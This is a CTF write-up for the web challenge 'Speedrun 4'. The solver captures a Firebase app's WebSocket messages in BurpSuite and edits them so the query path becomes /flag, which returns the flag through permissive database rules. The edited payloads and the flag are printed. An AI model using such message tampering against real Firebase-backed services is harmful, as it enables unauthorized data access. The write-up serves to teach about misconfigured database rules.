# Speedrun 4

Web<br/>


### Description
[https://udctf-fb.firebaseapp.com/](https://udctf-fb.firebaseapp.com/)

<br/><br/><br/>

### Solution

#### Discovery
We used BurpSuite<br/>
At first, we disable intercept<br/>
Under Proxy -> WebSockets history, we filtered such that we only saw outgoing messages<br/>
We see that it always sends 4 times<br/>
The content are as follows:<br/>
1. `{"t":"d","d":{"r":1,"a":"s","b":{"c":{"sdk.js.8-3-1":1}}}}`
2. `{"t":"d","d":{"r":2,"a":"q","b":{"p":"/books","h":""}}}`
3. `{"t":"d","d":{"r":3,"a":"n","b":{"p":"/books"}}}`
4. `{"t":"d","d":{"r":4,"a":"q","b":{"p":"/books","h":""}}}`

We realise that they access directories<br/>

#### Getting the flag
We enable intercept to see the incoming messages<br/>
We edit the 2nd and 3rd messages<br/>
2nd message became `{"t":"d","d":{"r":1,"a":"q","b":{"p":"/flag","h":""}}}`<br/>
3rd message became `{"t":"c","d":{"t":"p","d":{flag}}}`<br/>
Then, it returned a message with the flag `{"t":"d","d":{"b":{"p":"flag","d":"UDCTF{l34rn_d4t4b4s3_rul3s}"},"a":"d"}}`<br/><br/>
<img src="./Assets/sr4.PNG" width="70%" height="70%"><br/>

<br/>
> UDCTF{l34rn_d4t4b4s3_rul3s}

<br/><br/><br/>

#### Obligatory bragging rights
My second ever first-blood on the same ctf LOL<br/>
<img src="./Assets/nice.PNG" width="30%" height="30%"><br/><br/>
<img src="./Assets/morelolzzz.PNG" width="30%" height="30%"><br/>